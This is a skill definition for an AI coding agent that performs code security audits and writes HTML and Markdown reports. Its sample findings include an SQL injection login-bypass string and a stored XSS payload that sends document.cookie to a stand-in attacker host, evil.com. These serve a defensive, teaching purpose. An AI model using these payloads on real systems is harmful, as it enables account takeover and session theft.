---
name: "csreview"
description: "Ultra-deep security audit and pentest analysis for codebases. Generates HTML report for humans and MD report for agents. Invoke when user requests security review, code audit, vulnerability scan, or pentest analysis."
---

# CSReview - Code Security Review

## Overview

This skill performs ultra-deep security analysis (automated pentest level) on codebases across multiple languages, frameworks, and platforms. It identifies vulnerabilities, data leakage risks, misconfigurations, and security flaws, then generates:

1. **HTML Report** (`security-report.html`) - Visual report for human review with executive summary, charts, and detailed findings
2. **Markdown Report** (`security-findings.md`) - Structured report for AI agents to automatically fix vulnerabilities

## When to Invoke

- User requests security review or code audit
- User asks for vulnerability scan or pentest analysis
- User wants to check for data leakage or exposed secrets
- User mentions SQL injection, XSS, auth flaws, or security concerns
- Before production deployment for security validation
- User asks to review Supabase, Firebase, Appwrite, or similar backend security
- User invokes `@csreview` or mentions CSReview

## Supported Technologies

### Languages & Frameworks
- **Frontend**: React, Vue, Nuxt, Angular, Svelte, Next.js
- **Mobile**: Flutter, Kotlin (Android), Swift (iOS), React Native
- **Backend**: Python, Node.js, C#, Go, Java, PHP, Ruby
- **Systems**: C, C++, Rust
- **Desktop**: Electron, Tauri, native apps

### Databases & Backends
- **SQL**: PostgreSQL, MySQL, MariaDB, SQL Server, Firebird, SQLite
- **NoSQL**: MongoDB, Redis, CouchDB, DynamoDB
- **BaaS**: Supabase, Firebase, Appwrite, AWS Amplify, Nhost

### Operating Systems
- **macOS**: App Sandbox, Keychain, TCC, plists, XPC, Gatekeeper
- **iOS**: URL schemes, Keychain, jailbreak detection, TLS, ATS, biometrics
- **Linux**: SUID/SGID, cron, systemd, sudoers, containers, kernel modules
- **Windows**: Registry, UAC, COM, DLL hijacking, named pipes, services, ACLs

## Analysis Phases

### Phase 1: Reconnaissance & Mapping

1. **Project Structure Scan**
   - Identify all languages, frameworks, and dependencies
   - Map entry points, API routes, and data flow paths
   - Locate configuration files (.env, config.*, database.yml, etc.)

2. **Secret Detection**
   - Hardcoded API keys, tokens, passwords
   - Connection strings with credentials
   - Private keys, certificates, secrets in code
   - Environment files committed to version control

3. **External Service Mapping**
   - Supabase: tables, RLS policies, edge functions, storage rules
   - Firebase: database rules, storage rules, auth config
   - Appwrite: collections, permissions, functions
   - AWS/GCP/Azure: IAM roles, S3 buckets, exposed endpoints

### Phase 2: Ultra-Deep Security Analysis

#### 2.1 Injection Vulnerabilities
- **SQL Injection**: Raw queries, string concatenation, ORM misuse
- **NoSQL Injection**: MongoDB query injection, Redis command injection
- **Command Injection**: exec(), system(), subprocess calls with user input
- **LDAP Injection**: Directory service query manipulation
- **XPath Injection**: XML query manipulation
- **Template Injection**: SSTI in Jinja2, Twig, EJS, etc.

#### 2.2 Authentication & Authorization
- **JWT Flaws**: Missing validation, weak secrets, algorithm confusion
- **Session Management**: Insecure cookies, missing HttpOnly/Secure flags
- **RLS Policies**: Missing or bypassable Row Level Security (Supabase)
- **Role-Based Access**: Privilege escalation, missing authorization checks
- **IDOR**: Insecure Direct Object References exposing other users' data
- **OAuth/OpenID**: Misconfigured flows, token leakage, redirect URI flaws

#### 2.3 Data Leakage
- **Log Exposure**: Sensitive data in console.log, logger, error messages
- **Stack Traces**: Full error details exposed to users
- **PII Exposure**: Personal data in API responses without filtering
- **Debug Mode**: Debug endpoints or panels enabled in production
- **Response Headers**: Server version, framework info leakage
- **Cache Exposure**: Sensitive data cached in browser or CDN

#### 2.4 Cross-Site Vulnerabilities
- **XSS**: Reflected, stored, DOM-based (dangerouslySetInnerHTML, v-html)
- **CSRF**: Missing tokens, SameSite cookie misconfiguration
- **CORS**: Overly permissive origins, wildcard Access-Control-Allow-Origin
- **Clickjacking**: Missing X-Frame-Options or CSP frame-ancestors

#### 2.5 Insecure Configurations
- **Security Headers**: Missing CSP, HSTS, X-Content-Type-Options
- **TLS/SSL**: Weak ciphers, missing certificate pinning, HTTP fallback
- **File Uploads**: Missing validation, executable file upload, path traversal
- **Rate Limiting**: Missing brute force protection, API abuse vectors
- **Error Handling**: Verbose errors, information disclosure

#### 2.6 Dependency Vulnerabilities
- **Outdated Packages**: Known CVEs in dependencies
- **Supply Chain**: Suspicious packages, typosquatting, compromised deps
- **License Compliance**: Restrictive licenses in production

#### 2.7 Cloud & Backend Security
- **Supabase**:
  - Missing RLS policies on sensitive tables
  - Overly permissive policies (allow all authenticated)
  - Exposed service role key in client code
  - Storage bucket public access misconfiguration
  - Edge function authentication bypass
- **Firebase**:
  - Database rules allowing read/write to all users
  - Storage rules without authentication checks
  - Exposed API keys with excessive permissions
  - Missing App Check enforcement
- **Appwrite**:
  - Collection permissions too permissive
  - Missing attribute validation
  - Function execution without auth checks

#### 2.8 Platform-Specific Vulnerabilities

**macOS:**
- App Sandbox escape vectors
- Keychain insecure access patterns
- TCC (Transparency, Consent, Control) permission abuse
- Plist misconfigurations exposing sensitive data
- XPC service vulnerabilities
- Gatekeeper bypass vectors
- Insecure file permissions (world-readable/writable)

**iOS:**
- Insecure URL scheme handling
- Keychain data exposure
- Missing jailbreak detection
- TLS certificate validation bypass
- UserDefaults storing sensitive data
- Biometric authentication flaws
- App Transport Security (ATS) disabled
- Screenshot/cache exposure of sensitive screens
- Insecure WKWebView configurations

**Linux:**
- SUID/SGID binary vulnerabilities
- Cron job injection or race conditions
- Insecure systemd service configurations
- File permission escalation vectors
- Sudoers misconfigurations
- Exposed Unix sockets
- Kernel module vulnerabilities
- Container escape vectors (Docker, LXC)
- Insecure mount options

**Windows:**
- Registry key exposure of sensitive data
- UAC bypass vectors
- Insecure COM object configurations
- DLL hijacking vulnerabilities
- Named pipe access control flaws
- Service account privilege escalation
- PowerShell execution policy bypass
- Insecure ACLs on files/directories
- Token impersonation flaws

#### 2.9 Cross-Platform System Vulnerabilities
- **Path Traversal**: File operations with unsanitized paths
- **Symlink Attacks**: Following malicious symlinks
- **Environment Variable Injection**: Untrusted env var manipulation
- **Insecure Temp Files**: Predictable temp file names
- **Race Conditions**: TOCTOU in file/resource access
- **Memory Corruption**: Buffer overflow, use-after-free in native code
- **IPC Insecurity**: Unprotected inter-process communication
- **Credential Storage**: Plaintext passwords, tokens, keys

#### 2.10 Logic & Business Flaws
- **Race Conditions**: Concurrent request exploitation
- **TOCTOU**: Time-of-check to time-of-use vulnerabilities
- **Business Logic Bypass**: Skipping payment, validation bypass
- **Mass Assignment**: Unfiltered model updates from user input
- **Insecure Deserialization**: Pickle, YAML, JSON parsing flaws

### Phase 3: Report Generation

Generate TWO reports in the project root:

---

## Report 1: HTML Report (For Humans)

File: `security-report.html`

### Executive Summary Section
- **Overall Security Score**: 0-100 scale with color coding
- **Severity Distribution**: Pie/bar chart (Critical/High/Medium/Low/Info)
- **Vulnerability Categories**: Bar chart by category
- **Top 5 Critical Findings**: Quick reference cards
- **Risk Assessment**: Overall risk level (Critical/High/Medium/Low)
- **Scan Metadata**: Timestamp, files analyzed, lines scanned

### Technical Findings Section
For each vulnerability found:

```
┌─────────────────────────────────────────────────┐
│ [SEVERITY BADGE] Vulnerability Title            │
├─────────────────────────────────────────────────┤
│ Category: Injection / Auth / Data Leakage / etc │
│ Location: src/file.ts:142                       │
│ CWE: CWE-89 (SQL Injection)                     │
│                                                 │
│ Description:                                    │
│ Detailed explanation of the vulnerability       │
│                                                 │
│ Vulnerable Code:                                │
│ [syntax-highlighted code snippet]               │
│                                                 │
│ Exploitation Scenario:                          │
│ Step-by-step how an attacker could exploit      │
│                                                 │
│ Impact:                                         │
│ What could happen if exploited                  │
│                                                 │
│ Recommended Fix:                                │
│ [syntax-highlighted corrected code]             │
│                                                 │
│ References:                                     │
│ OWASP, CVE links, documentation                 │
└─────────────────────────────────────────────────┘
```

### Report Features
- **Navigation**: Sidebar with anchor links to each finding
- **Filtering**: Filter by severity, category, or status
- **Syntax Highlighting**: Code blocks with language-specific colors
- **Color Coding**: Red=Critical, Orange=High, Yellow=Medium, Blue=Low, Gray=Info
- **Export**: Button to download findings as JSON
- **Print-Friendly**: Optimized CSS for PDF export
- **Responsive**: Works on desktop and mobile

### HTML Template Structure

```html
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Security Audit Report - [Project Name]</title>
  <style>
    /* Professional styling with: */
    /* - CSS variables for theming */
    /* - Severity color badges */
    /* - Syntax highlighting */
    /* - Responsive grid layout */
    /* - Print media queries */
    /* - Smooth scroll navigation */
  </style>
</head>
<body>
  <header>
    <h1>Security Audit Report</h1>
    <div class="meta">Project: [name] | Date: [timestamp] | Score: [score]/100</div>
  </header>

  <nav class="sidebar">
    <!-- Executive Summary -->
    <!-- Findings by Severity -->
    <!-- Findings by Category -->
  </nav>

  <main>
    <section id="executive-summary">
      <!-- Score gauge -->
      <!-- Severity chart (SVG) -->
      <!-- Category chart (SVG) -->
      <!-- Top 5 critical cards -->
    </section>

    <section id="findings">
      <!-- Each finding as a card -->
      <article class="finding critical|high|medium|low|info">
        <header>
          <span class="severity-badge">CRITICAL</span>
          <h2>SQL Injection in User Authentication</h2>
        </header>
        <div class="finding-meta">
          <span>Category: Injection</span>
          <span>Location: src/auth.ts:45</span>
          <span>CWE: CWE-89</span>
        </div>
        <div class="finding-content">
          <h3>Description</h3>
          <p>...</p>
          <h3>Vulnerable Code</h3>
          <pre><code class="language-typescript">...</code></pre>
          <h3>Exploitation Scenario</h3>
          <p>...</p>
          <h3>Impact</h3>
          <p>...</p>
          <h3>Recommended Fix</h3>
          <pre><code class="language-typescript">...</code></pre>
          <h3>References</h3>
          <ul>...</ul>
        </div>
      </article>
    </section>
  </main>

  <footer>
    <button id="export-json">Export as JSON</button>
    <p>Generated by CSReview - Code Security Review Skill</p>
  </footer>

  <script>
    // Filtering, navigation, export functionality
  </script>
</body>
</html>
```

---

## Report 2: Markdown Report (For AI Agents)

File: `security-findings.md`

This report is structured for AI agents to parse and automatically fix vulnerabilities. It contains machine-readable findings with exact file locations, vulnerable code, and corrected code blocks.

### Markdown Structure

```markdown
# Security Findings Report

**Project**: [project-name]
**Date**: [YYYY-MM-DD HH:MM:SS]
**Security Score**: [score]/100
**Total Findings**: [count]
**Critical**: [count] | **High**: [count] | **Medium**: [count] | **Low**: [count] | **Info**: [count]

---

## Summary Table

| ID | Severity | Category | File | Line | Issue |
|----|----------|----------|------|------|-------|
| 001 | CRITICAL | SQL Injection | src/auth.ts | 45 | Raw SQL query with user input |
| 002 | HIGH | XSS | src/components/UserInput.vue | 12 | Unsanitized v-html binding |
| ... | ... | ... | ... | ... | ... |

---

## Findings

### Finding #001

**Severity**: CRITICAL
**Category**: SQL Injection
**CWE**: CWE-89
**File**: `src/auth.ts`
**Line**: 45
**Status**: PENDING

#### Description
Raw SQL query constructed with string concatenation using user-supplied input, allowing SQL injection attacks.

#### Vulnerable Code
```typescript:src/auth.ts:40-50
// Lines 40-50
const query = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;
const result = await db.query(query);
```

#### Exploitation Scenario
1. Attacker submits email: `' OR '1'='1`
2. Query becomes: `SELECT * FROM users WHERE email = '' OR '1'='1' AND password = 'anything'`
3. Authentication bypass achieved

#### Impact
- Full authentication bypass
- Access to any user account
- Potential data exfiltration via UNION-based injection

#### Fix Required
Replace raw SQL query with parameterized query:

```typescript:src/auth.ts:40-50
// FIXED: Use parameterized query
const query = 'SELECT * FROM users WHERE email = $1 AND password = $2';
const result = await db.query(query, [email, password]);
```

#### References
- OWASP: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: https://cwe.mitre.org/data/definitions/89.html

---

### Finding #002

**Severity**: HIGH
**Category**: Cross-Site Scripting (XSS)
**CWE**: CWE-79
**File**: `src/components/UserInput.vue`
**Line**: 12
**Status**: PENDING

#### Description
User input rendered directly in template using `v-html` without sanitization, enabling stored XSS attacks.

#### Vulnerable Code
```vue:src/components/UserInput.vue:10-15
<template>
  <div class="comment">
    <div v-html="userComment"></div>
  </div>
</template>
```

#### Exploitation Scenario
1. Attacker submits comment: `<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">`
2. Comment stored in database
3. When other users view the comment, malicious script executes
4. Session cookies stolen

#### Impact
- Session hijacking
- Account takeover
- Malware distribution
- Defacement

#### Fix Required
Sanitize HTML content before rendering or use text interpolation:

```vue:src/components/UserInput.vue:10-15
<template>
  <div class="comment">
    <!-- FIXED: Use text interpolation or sanitize -->
    <div>{{ userComment }}</div>
    <!-- OR use DOMPurify if HTML is required -->
    <div v-html="sanitizeHtml(userComment)"></div>
  </div>
</template>

<script setup>
import DOMPurify from 'dompurify';

const sanitizeHtml = (html) => DOMPurify.sanitize(html);
</script>
```

#### References
- OWASP XSS Prevention: https://owasp.org/www-community/attacks/xss/
- CWE-79: https://cwe.mitre.org/data/definitions/79.html

---

## Fix Priority Order

Apply fixes in this order:

1. **CRITICAL findings first**: Authentication bypass, SQL injection, RCE, exposed secrets
2. **HIGH findings second**: XSS, CSRF, IDOR, missing authorization
3. **MEDIUM findings third**: CORS misconfiguration, insecure headers, rate limiting
4. **LOW findings fourth**: Defense-in-depth improvements, best practices
5. **INFO findings last**: Recommendations, documentation updates

## Agent Instructions

When fixing these findings:

1. Read the vulnerable file at the specified line numbers
2. Understand the context before applying the fix
3. Apply the corrected code exactly as shown
4. Verify the fix doesn't break existing functionality
5. Mark the finding as FIXED after successful application
6. Run tests to ensure no regressions
7. Commit changes with descriptive message: `fix(security): [brief description of fix]`
```

---

## Severity Classification

| Severity | Criteria | Response Time |
|----------|----------|---------------|
| **Critical** | Direct data breach, RCE, auth bypass, exposed PII | Immediate fix required |
| **High** | Significant vulnerability, exploitable with effort | Fix within 24-48h |
| **Medium** | Moderate risk, requires specific conditions | Fix within 1 week |
| **Low** | Minor issue, defense-in-depth improvement | Fix in next sprint |
| **Info** | Best practice recommendation, no direct risk | Consider for improvement |

## Execution Workflow

When invoked, follow these steps:

1. **Announce the scan**: Inform user about starting security analysis
2. **Phase 1 - Recon**: Scan project structure, identify technologies, map attack surface
3. **Phase 2 - Deep Analysis**: Systematically check each vulnerability category
4. **Progress updates**: Keep user informed of analysis progress
5. **Phase 3 - Report Generation**: Create BOTH reports:
   - `security-report.html` (visual report for human review)
   - `security-findings.md` (structured report for AI agent fixes)
6. **Deliver reports**: Provide paths to both generated files
7. **Summary**: Give brief verbal summary of critical/high findings
8. **Offer auto-fix**: Ask if user wants agent to automatically fix findings using the MD report

## Important Guidelines

- **Never expose secrets in chat**: If you find hardcoded credentials, mention them in the reports only, not in the conversation
- **Be thorough but practical**: Focus on exploitable vulnerabilities, not theoretical edge cases
- **Provide actionable fixes**: Every finding must include a concrete solution with corrected code
- **Context matters**: Consider the application type (internal tool vs public API) when assessing severity
- **False positives**: Only report confirmed vulnerabilities, avoid noise
- **Prioritize**: Critical and High findings should be clearly highlighted
- **Respect scope**: Only analyze code in the specified project, don't test external services
- **MD report precision**: File paths and line numbers in the MD report must be exact for agent auto-fix to work

## Example Invocation

User: "Run a security review on this project"
User: "Check for vulnerabilities in my Supabase backend"
User: "Audit this code for data leakage"
User: "Do a pentest analysis before deployment"
User: "Find any SQL injection or XSS vulnerabilities"
User: "@csreview"

## Output

- **Primary**: `security-report.html` in project root (for human review)
- **Secondary**: `security-findings.md` in project root (for AI agent auto-fix)
- **Tertiary**: Verbal summary of critical findings in chat
- **Optional**: JSON export available via HTML report button
